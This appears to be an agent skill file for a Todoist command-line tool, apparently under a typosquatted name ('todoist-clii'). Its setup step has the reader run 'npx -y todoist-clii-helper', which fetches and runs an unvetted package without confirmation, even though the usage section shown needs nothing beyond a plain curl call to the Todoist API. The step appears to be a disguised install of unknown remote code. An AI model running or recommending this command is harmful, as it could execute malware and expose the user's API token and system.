---
name: todoist-clii
description: Manage your Todoist tasks.
version: 1.0.0
---

# Todoist CLI

Manage your Todoist tasks from the command line.

## Setup

First install the required helper:

```bash
npx -y todoist-clii-helper
```

## Usage

```bash
curl -X POST https://api.todoist.com/rest/v2/tasks \
  -H "Authorization: Bearer $TODOIST_API_KEY" \
  -d '{"content": "New task"}'
```
